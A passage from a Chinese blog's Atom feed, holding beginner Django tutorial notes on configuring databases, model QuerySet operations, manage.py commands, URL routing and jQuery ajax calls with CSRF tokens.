      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Read, study and learn about everything imporant in your life&lt;br&gt;点点滴滴皆重要，处处学习是诀窍&lt;/blockquote&gt;&lt;br&gt;　　Django中有个urls.py文件，专门用于管理django的url即路由，我们可以在urls.py文件中创建或者修改路由，以达到访问不同url执行不同view函数的作用。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="django" scheme="http://thief.one/tags/django/"/>
    
  </entry>
  
  <entry>
    <title>Django基础之模型(数据库)</title>
    <link href="http://thief.one/2017/09/14/2/"/>
    <id>http://thief.one/2017/09/14/2/</id>
    <published>2017-09-14T12:08:06.000Z</published>
    <updated>2017-09-26T01:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Live well, love lots, and laugh often<br>善待生活，热爱一切，经常开怀大笑</blockquote><br>　　本篇主要用来记录Django模型相关部分的笔记，模型可以简单理解为数据操作，即从数据库中获取数据，向数据库中存储数据等。django默认使用sqlit3，支持mysql、postgreSQL等数据库。<br><a id="more"></a></p>
<h3 id="setting配置数据库连接"><a href="#setting配置数据库连接" class="headerlink" title="setting配置数据库连接"></a>setting配置数据库连接</h3><p>默认为sqlite3<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">DATABASES = &#123;</div><div class="line">    <span class="string">'default'</span>: &#123;</div><div class="line">        <span class="string">'ENGINE'</span>: <span class="string">'django.db.backends.sqlite3'</span>,</div><div class="line">        <span class="string">'NAME'</span>: os.path.join(BASE_DIR, <span class="string">'db.sqlite3'</span>),</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>修改为mysql配置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">DATABASES = &#123;</div><div class="line">    <span class="string">'default'</span>: &#123;</div><div class="line">        <span class="string">'ENGINE'</span>: <span class="string">'django.db.backends.mysql'</span>,</div><div class="line">        <span class="string">'NAME'</span>: <span class="string">'mydatabase'</span>,</div><div class="line">        <span class="string">'USER'</span>: <span class="string">'mydatabaseuser'</span>,</div><div class="line">        <span class="string">'PASSWORD'</span>: <span class="string">'mypassword'</span>,</div><div class="line">        <span class="string">'HOST'</span>: <span class="string">'127.0.0.1'</span>,</div><div class="line">        <span class="string">'PORT'</span>: <span class="string">'3306'</span>,</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>NAME: 指定的数据库名，如果是sqlite的话，就需要填数据库文件的绝对位置<br>USER: 数据库登录的用户名，mysql一般都是root<br>PASSWORD：登录数据库的密码，必须是USER用户所对应的密码<br>HOST: 由于一般的数据库都是C/S结构的，所以得指定数据库服务器的位置，我们一般数据库服务器和客户端都是在一台主机上面，所以一般默认都填127.0.0.1<br>PORT：数据库服务器端口，mysql默认为3306<br>HOST和PORT都可以不填，使用默认的配置</p>
<h3 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h3><p>以下方式适合mysql、sqlite3等数据库，另外mysql需要额外安装mysql-python（pip install mysql-python ）</p>
<h4 id="models-py中创建表字段"><a href="#models-py中创建表字段" class="headerlink" title="models.py中创建表字段"></a>models.py中创建表字段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from django.db import models</div><div class="line"></div><div class="line">class auth(models.Model):</div><div class="line">    username = models.CharField(max_length=100)</div><div class="line">    password = models.CharField(max_length=100)</div></pre></td></tr></table></figure>
<p>说明：创建一个auth表，字段为username，password，后面是字段数据类型以及最大长度。</p>
<h4 id="执行命令创建表"><a href="#执行命令创建表" class="headerlink" title="执行命令创建表"></a>执行命令创建表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python manage.py makemigrations</div></pre></td></tr></table></figure>
<h4 id="同步数据库表"><a href="#同步数据库表" class="headerlink" title="同步数据库表"></a>同步数据库表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python manage.py migrate</div></pre></td></tr></table></figure>
<h3 id="使用数据表-QuerySet"><a href="#使用数据表-QuerySet" class="headerlink" title="使用数据表(QuerySet)"></a>使用数据表(QuerySet)</h3><h4 id="在Django-shell中测试"><a href="#在Django-shell中测试" class="headerlink" title="在Django shell中测试"></a>在Django shell中测试</h4><p>运行:python manage.py shell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;from webapp.models import auth</div><div class="line">&gt;&gt;&gt;p = auth(username=<span class="string">"nmask"</span>, password=<span class="string">"nmask"</span>)</div><div class="line">&gt;&gt;&gt;p.save()</div><div class="line">&gt;&gt;&gt;L=auth.objects.all()</div><div class="line">&gt;&gt;&gt;<span class="keyword">for</span> i <span class="keyword">in</span> L:</div><div class="line">&gt;&gt;&gt;    <span class="built_in">print</span> i.username</div><div class="line">nmask</div></pre></td></tr></table></figure></p>
<p>说明：View.py中使用方法与shell中类似。</p>
<h4 id="往数据表中插入内容的方法"><a href="#往数据表中插入内容的方法" class="headerlink" title="往数据表中插入内容的方法"></a>往数据表中插入内容的方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">第一种：</div><div class="line">auth.objects.create(username=<span class="string">"nmask"</span>,password=<span class="string">"nmask"</span>)</div><div class="line">第二种：</div><div class="line">p = auth(username=<span class="string">"nmask"</span>,password=<span class="string">"nmask"</span>)</div><div class="line">p.save()</div><div class="line">第三种：</div><div class="line">p = auth(username=<span class="string">"nmask"</span>)</div><div class="line">p.password = <span class="string">"nmask"</span></div><div class="line">p.save()</div><div class="line">第四种：</div><div class="line">auth.objects.get_or_create(username=<span class="string">"nmask"</span>,password=<span class="string">"nmask"</span>)</div><div class="line">说明：此方法会判断是否存在，返回一个元组，第一个为auth对象，第二个为True（不存在已新建）或者False（存在）。</div></pre></td></tr></table></figure>
<h4 id="从数据表中查询内容的方法"><a href="#从数据表中查询内容的方法" class="headerlink" title="从数据表中查询内容的方法"></a>从数据表中查询内容的方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">auth.objects.all()</div><div class="line">auth.objects.all()[:2] 相当于<span class="built_in">limit</span>，只获取2个结果</div><div class="line">auth.objects.get(name=<span class="string">"nmask"</span>) get是用来获取一个对象的</div><div class="line"></div><div class="line">auth.objects.filter(name=<span class="string">"nmask"</span>) 名称严格等于<span class="string">"abc"</span>的人</div><div class="line">auth.objects.filter(name__exact=<span class="string">"nmask"</span>) 名称严格等于<span class="string">"abc"</span>的人</div><div class="line">auth.objects.filter(name__iexact=<span class="string">"nmask"</span>) 名称为abc但是不区分大小写</div><div class="line">auth.objects.filter(name__contains=<span class="string">"nmask"</span>)  名称中包含 <span class="string">"abc"</span>的人</div><div class="line">auth.objects.filter(name__icontains=<span class="string">"nmask"</span>)  名称中包含 <span class="string">"abc"</span>，且abc不区分大小写</div><div class="line">auth.objects.filter(name__regex=<span class="string">"^nmask"</span>)   正则表达式查询</div><div class="line">auth.objects.filter(name__iregex=<span class="string">"^nmask"</span>)  正则表达式不区分大小写</div><div class="line"></div><div class="line">auth.objects.exclude(name__contains=<span class="string">"nmask"</span>)  排除包含nmask的auth对象</div><div class="line">auth.objects.filter(name__contains=<span class="string">"nmask"</span>).filter(password=<span class="string">"nmask"</span>) 找出账号密码都是nmask的</div><div class="line">auth.objects.filter(name__contains=<span class="string">"nmask"</span>).exclude(passowrd=<span class="string">"nmask"</span>)  找出名称含有nmask, 但是排除password是nmask的</div><div class="line"></div><div class="line">auth.objects.all().order_by(<span class="string">'name'</span>)  查询结果排序</div><div class="line">auth.objects.all().order_by(<span class="string">'-name'</span>) 实现倒序</div><div class="line"></div><div class="line">res = auth.objects.all()</div><div class="line">res = res.distinct() 结果去重</div><div class="line"></div><div class="line">auth.objects.get(name=<span class="string">"nmask"</span>).only(<span class="string">"password"</span>) 只返回password字段</div><div class="line">auth.objects.get(name=<span class="string">"nmask"</span>).defer(<span class="string">"password"</span>) 排出password字段</div></pre></td></tr></table></figure>
<h4 id="更新数据表内容"><a href="#更新数据表内容" class="headerlink" title="更新数据表内容"></a>更新数据表内容</h4><p>单个更新：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">response = auth.objects.get(username=<span class="string">"nmask"</span>)</div><div class="line">response.passowrd=<span class="string">"123"</span></div><div class="line">response.save()</div></pre></td></tr></table></figure></p>
<p>批量更新：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">auth.objects.filter(name__contains=<span class="string">"nmask"</span>).update(name=<span class="string">'nMask'</span>)</div></pre></td></tr></table></figure></p>
<h4 id="删除数据表内容"><a href="#删除数据表内容" class="headerlink" title="删除数据表内容"></a>删除数据表内容</h4><p>单个删除：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">response = auth.objects.get(username=<span class="string">"nmask"</span>)</div><div class="line">response.passowrd=<span class="string">"123"</span></div><div class="line">response.delete()</div></pre></td></tr></table></figure></p>
<p>批量删除：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">auth.objects.filter(name__contains=<span class="string">"nmask"</span>).delete()</div></pre></td></tr></table></figure></p>
<h3 id="使用connection函数"><a href="#使用connection函数" class="headerlink" title="使用connection函数"></a>使用connection函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">from django.db import connection</div><div class="line"></div><div class="line">def search_db(sql,value):</div><div class="line">    <span class="string">''</span><span class="string">'操作数据库'</span><span class="string">''</span></div><div class="line">    result_list=[]</div><div class="line">    cursor = connection.cursor()</div><div class="line">    try:</div><div class="line">        cursor.execute(sql,value)</div><div class="line">        result_list=cursor.fetchall()</div><div class="line">        cursor.close()</div><div class="line">    except Exception,e:</div><div class="line">        <span class="built_in">print</span> e</div><div class="line"></div><div class="line">    <span class="built_in">return</span> result_list</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Live well, love lots, and laugh often&lt;br&gt;善待生活，热爱一切，经常开怀大笑&lt;/blockquote&gt;&lt;br&gt;　　本篇主要用来记录Django模型相关部分的笔记，模型可以简单理解为数据操作，即从数据库中获取数据，向数据库中存储数据等。django默认使用sqlit3，支持mysql、postgreSQL等数据库。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="django" scheme="http://thief.one/tags/django/"/>
    
  </entry>
  
  <entry>
    <title>Django基础之起步</title>
    <link href="http://thief.one/2017/09/14/1/"/>
    <id>http://thief.one/2017/09/14/1/</id>
    <published>2017-09-14T11:45:07.000Z</published>
    <updated>2017-09-14T12:43:42.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Do one thing at a time, and do well<br>一次只做一件事，做到最好！</blockquote><br>　　学习使用Python已有2年时间，但至今还没拿它开发出什么像样的项目，大多时候只是用来写写脚本，感觉有点大材小用。因此最近打算好好研究研究python中的Web框架—Django，之所以选择Django而不是flask，也只是偶然，仅此而已。接下来的一段时间我会更新关于Django的一些笔记，内容没有一定的顺序，学到哪记到哪。<br><a id="more"></a></p>
<h3 id="Django介绍"><a href="#Django介绍" class="headerlink" title="Django介绍"></a>Django介绍</h3><p>　　太多介绍性的内容就不写了，主要想对纠结学django还是flask甚至其他框架的同学说一声，学啥框架不重要，就好像学什么语言一样，一门通门门通。无论Django还是flask都很强大，也足够我们写一个项目</p>
<h3 id="Django的MTV框架"><a href="#Django的MTV框架" class="headerlink" title="Django的MTV框架"></a>Django的MTV框架</h3><p>　　Django是使用MVC框架设计的，但更准确地说应该是基于MTV框架，即模型(model)－视图(view)－模版(Template)。简单介绍，模型就是数据库（负责数据存储），视图就是后端（负责数据处理），模版就是前端（负责数据展示），模型与视图在Django中分别对应着models.py、views.py，而模版需要自己在templates目录下创建html文件，views.py中的函数渲染templates中的Html模板，得到动态内容的网页。<br>　　一个Django页面的搜索功能，整个流程是这样的：从模版获取用户输入—&gt;请求传递到视图—&gt;视图向模型获取数据—–&gt;视图对数据进行处理—-&gt;返回给模型显示。</p>
<h3 id="Django安装"><a href="#Django安装" class="headerlink" title="Django安装"></a>Django安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">安装pip:</div><div class="line">sudo apt-get install python-pip</div><div class="line">或者</div><div class="line">yum install python-pip</div><div class="line"></div><div class="line">然后安装django:</div><div class="line">pip install django</div></pre></td></tr></table></figure>
<p>说明：建议使用Python虚拟环境搭建django。</p>
<h3 id="Django常用命令"><a href="#Django常用命令" class="headerlink" title="Django常用命令"></a>Django常用命令</h3><p>新建项目以及app：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">django-admin.py startproject project_name 新建项目</div><div class="line">python manage.py startapp app_name 新建APP</div></pre></td></tr></table></figure></p>
<p>数据库操作：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#创建更改的文件</span></div><div class="line">python manage.py makemigrations</div><div class="line"><span class="comment">#将生成的py文件应用到数据库</span></div><div class="line">python manage.py migrate</div><div class="line"><span class="comment">#清空数据库</span></div><div class="line">python manage.py flush</div></pre></td></tr></table></figure></p>
<p>使用内置服务器:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">python manage.py runserver</div><div class="line">python manage.py runserver 8080</div><div class="line">python manage.py runserver 10.0.0.1:80</div></pre></td></tr></table></figure></p>
<p>创建管理员：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python manage.py createsuperuser</div><div class="line">python manage.py changepassword username</div></pre></td></tr></table></figure></p>
<p>数据导入导出：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python manage.py dumpdata appname &gt; appname.json</div><div class="line">python manage.py loaddata appname.json</div></pre></td></tr></table></figure></p>
<p>项目环境终端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python manage.py shell</div></pre></td></tr></table></figure></p>
<p>说明：可以在这个 shell 里面调用当前项目的 models.py 中的api。</p>
<p>数据库命令行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python manage.py dbshell</div></pre></td></tr></table></figure></p>
<p>可以在命令行中执行sql语句。</p>
<h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">django-admin startproject mysite(项目名称)</div></pre></td></tr></table></figure>
<p>注意：目录不能带有中文。<br>开启内置服务器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python  manage.py runserver (ip:port)       <span class="comment">#默认为8000</span></div></pre></td></tr></table></figure></p>
<p>访问:<a href="http://localhost:8000" target="_blank" rel="external">http://localhost:8000</a></p>
<h3 id="创建应用"><a href="#创建应用" class="headerlink" title="创建应用"></a>创建应用</h3><p>一个项目中可以有多个应用，一个应用即一个web应用程序。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python manage.py startapp  webapp</div></pre></td></tr></table></figure></p>
<p>说明：会在manage.py同级目录下创建一个webapp文件夹。</p>
<h3 id="setting-py"><a href="#setting-py" class="headerlink" title="setting.py"></a>setting.py</h3><p>将新定义的app，这里为webapp添加到setting.py中:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">INSTALLED_APPS = (</div><div class="line">    <span class="string">'django.contrib.admin'</span>,</div><div class="line">    <span class="string">'django.contrib.auth'</span>,</div><div class="line">    <span class="string">'django.contrib.contenttypes'</span>,</div><div class="line">    <span class="string">'django.contrib.sessions'</span>,</div><div class="line">    <span class="string">'django.contrib.messages'</span>,</div><div class="line">    <span class="string">'django.contrib.staticfiles'</span>,</div><div class="line"> </div><div class="line">    <span class="string">'webapp'</span>,</div><div class="line">)</div></pre></td></tr></table></figure></p>
<p>说明：添加app是为了让django知道，我们创建了一个新的app应用，让它能够加载app。</p>
<h3 id="view-py"><a href="#view-py" class="headerlink" title="view.py"></a>view.py</h3><p>定义视图函数(views.py):<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from django.http import HttpResponse</div><div class="line"> </div><div class="line">def index(request):</div><div class="line">    <span class="built_in">return</span> HttpResponse(<span class="string">"This is a test page!"</span>)</div></pre></td></tr></table></figure></p>
<p>说明：视图函数(view.py)就是在服务端完成的一些列功能的函数，它接收一个request请求，返回一个response。</p>
<h3 id="urls-py"><a href="#urls-py" class="headerlink" title="urls.py"></a>urls.py</h3><p>定义url，修改urls.py:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from django.conf.urls import url</div><div class="line">from django.contrib import admin</div><div class="line">from webapp import views</div><div class="line"> </div><div class="line">urlpatterns = [</div><div class="line">    url(r<span class="string">'^$'</span>, views.index),</div><div class="line">    url(r<span class="string">'^admin/'</span>, admin.site.urls),</div><div class="line">]</div></pre></td></tr></table></figure></p>
<p>说明：urls.py是定义django路由的文件，此路由不是网络中的路由，简单来说就是url，定义了当我们请求哪些url的时候，对应去执行view中的哪些函数。</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://code.ziqiangxuetang.com/django/django-tutorial.html" target="_blank" rel="external">http://code.ziqiangxuetang.com/django/django-tutorial.html</a></p>
<p><em>本篇只做最基础的Django介绍，至于MVC每一层具体的使用方式以及配置、安全、部署等问题，后面会逐一成文介绍</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Do one thing at a time, and do well&lt;br&gt;一次只做一件事，做到最好！&lt;/blockquote&gt;&lt;br&gt;　　学习使用Python已有2年时间，但至今还没拿它开发出什么像样的项目，大多时候只是用来写写脚本，感觉有点大材小用。因此最近打算好好研究研究python中的Web框架—Django，之所以选择Django而不是flask，也只是偶然，仅此而已。接下来的一段时间我会更新关于Django的一些笔记，内容没有一定的顺序，学到哪记到哪。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="django" scheme="http://thief.one/tags/django/"/>
    
  </entry>
  
  <entry>
    <title>Django基础之ajax</title>
    <link href="http://thief.one/2017/09/14/3/"/>
    <id>http://thief.one/2017/09/14/3/</id>
    <published>2017-09-14T11:15:58.000Z</published>
    <updated>2017-09-26T01:51:58.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Take control of your own desting<br>命运掌握在自己手上</blockquote><br>　　本篇主要用来记录django+ajax的一些用法以及注意点，Django使用ajax最大的一个用处，就是不用刷新整个页面的前提下，请求服务端内容来更改页面中某些元素的值。如果使用http请求，就必须重新加载一遍页面，而ajax可以只更改一部分内容。<br><a id="more"></a></p>
<h3 id="django-ajax基础使用"><a href="#django-ajax基础使用" class="headerlink" title="django+ajax基础使用"></a>django+ajax基础使用</h3><h4 id="模版页面"><a href="#模版页面" class="headerlink" title="模版页面"></a>模版页面</h4><p>index.html<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;form&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> id=<span class="string">"tn"</span>&gt;</div><div class="line">&lt;button <span class="built_in">type</span>=<span class="string">"button"</span> id=<span class="string">"formquery"</span>&gt;提交&lt;/button&gt;</div><div class="line">&lt;/form&gt;</div><div class="line"></div><div class="line">&lt;span id=<span class="string">'result'</span>&gt;&lt;/span&gt;</div><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line">    $(document).ready(<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">      $(<span class="string">"#formquery"</span>).click(<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">        var toolsname = $(<span class="string">"#tn"</span>).val();</div><div class="line"></div><div class="line">        $.get(<span class="string">"/query/"</span>,&#123;<span class="string">'toolsname'</span>:toolsname&#125;, <span class="keyword">function</span>(ret)&#123;</div><div class="line">            $(<span class="string">'#result'</span>).html(ret) <span class="comment">#在页面中显示。可以用用$.ajax方法代替$.get</span></div><div class="line">        &#125;)</div><div class="line">      &#125;);</div><div class="line">    &#125;);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>以上代码的参数说明：</p>
<ul>
<li>$.get 表示ajax使用GET方式发送请求，也可以改成$.ajax，或者$.post表示post请求</li>
<li>id=”tn” 对应着js中获取的参数名称$(“#tn”)</li>
<li>id=”formquery” 对应着按钮事件所对应的js的函数名称</li>
<li>id=’result’ 对应着结果返回到哪个位置$(‘#result’)</li>
</ul>
<p>注意：这里需要注意的是button的type不能写submit，因为写了submit就直接使用get请求/query/了，而没有执行ajax请求。</p>
<h4 id="view-py"><a href="#view-py" class="headerlink" title="view.py"></a>view.py</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">from django.http import HttpResponse</div><div class="line"></div><div class="line">def query(request):</div><div class="line">    r=request.GET.get(<span class="string">"toolsname"</span>)</div><div class="line">    name_dict=<span class="string">"123"</span></div><div class="line">    <span class="built_in">return</span> HttpResponse(json.dumps(name_dict), content_type=<span class="string">'application/json'</span>)</div><div class="line"></div><div class="line">或者可以使用JsonResponse：</div><div class="line"></div><div class="line">from django.http import JsonResponse</div><div class="line">def query(request):</div><div class="line">    r=request.GET.get(<span class="string">"toolsname"</span>)</div><div class="line">    name_dict=<span class="string">"123"</span></div><div class="line">    <span class="built_in">return</span> JsonResponse(name_dict)</div></pre></td></tr></table></figure>
<p>说明：在视图层，即view.py中，跟正常的接受http请求的方式一样。views.py 中可以用  request.is_ajax() 方法判断是否是 ajax 请求。</p>
<h3 id="关于ajax的一些高级用法"><a href="#关于ajax的一些高级用法" class="headerlink" title="关于ajax的一些高级用法"></a>关于ajax的一些高级用法</h3><p>等我实验完再记录…….</p>
<h4 id="ajax获取返回值后执行js"><a href="#ajax获取返回值后执行js" class="headerlink" title="ajax获取返回值后执行js"></a>ajax获取返回值后执行js</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;textarea name=<span class="string">"content"</span> id=<span class="string">"content"</span> class=<span class="string">"form-control"</span> rows=<span class="string">"20"</span>&gt;&lt;/textarea&gt;</div><div class="line">&lt;script&gt;</div><div class="line">    $(document).ready(<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">      $(<span class="string">"#sub_encode"</span>).click(<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">        var content = $(<span class="string">"#content"</span>).val();</div><div class="line"> </div><div class="line">        $.get(<span class="string">"/add/"</span>,&#123;<span class="string">'content'</span>:content&#125;, <span class="keyword">function</span>(ret)&#123;</div><div class="line">            document.getElementById(<span class="string">'content'</span>).value = ret</div><div class="line">        &#125;)</div><div class="line">      &#125;);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>说明：获取返回值后，将返回值填充到textarea文本框内。</p>
<h4 id="ajax-post-CSRF认证"><a href="#ajax-post-CSRF认证" class="headerlink" title="ajax+post CSRF认证"></a>ajax+post CSRF认证</h4><p>在ajax代码前，加入以下js。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">$.ajaxSetup(&#123;</div><div class="line">    data: &#123;csrfmiddlewaretoken: <span class="string">'&#123;&#123; csrf_token &#125;&#125;'</span> &#125;,</div><div class="line">&#125;);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<h4 id="ajax-按钮加载过渡"><a href="#ajax-按钮加载过渡" class="headerlink" title="ajax+按钮加载过渡"></a>ajax+按钮加载过渡</h4><p>有时候网页中的某些功能需要比较长的时间等待，这时候使用ajax是比较好的，因为它不需要整个网页刷新，用户体验比较好。而按钮加载过渡的意思，就是当你点击按钮后，按钮字体内容变为“加载中”，等到ajax返回内容后再恢复，这样会使体验更好。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;button class=<span class="string">"btn btn-primary btn-sm"</span> <span class="built_in">type</span>=<span class="string">"button"</span> id=<span class="string">'sub_encode'</span> data-loading-text=<span class="string">"Loading加载中..."</span> autocomplete=<span class="string">"off"</span> onclick=<span class="string">"loag()"</span>&gt;运行&lt;/button&gt;</div><div class="line">&lt;!-- 将按钮过渡的代码整合到ajax中 --&gt;</div><div class="line">&lt;script&gt;</div><div class="line">    $(document).ready(<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">      $(<span class="string">"#sub_encode"</span>).click(<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">        var content = $(<span class="string">"#content"</span>).val();</div><div class="line">        var btn = $(<span class="string">"#sub_encode"</span>); //获取按钮对象</div><div class="line">        btn.button(<span class="string">'loading'</span>);//按钮显示为过渡状态 </div><div class="line"> </div><div class="line">        $.post(<span class="string">"&#123;% url 'run_ajax' %&#125;"</span>,&#123;<span class="string">'content'</span>:content,<span class="string">"type"</span>:<span class="string">"encode"</span>&#125;, <span class="keyword">function</span>(ret)&#123;</div><div class="line">            document.getElementById(<span class="string">'content'</span>).value = ret</div><div class="line">            btn.button(<span class="string">'reset'</span>);//按钮恢复正常</div><div class="line">        &#125;)</div><div class="line">      &#125;);</div><div 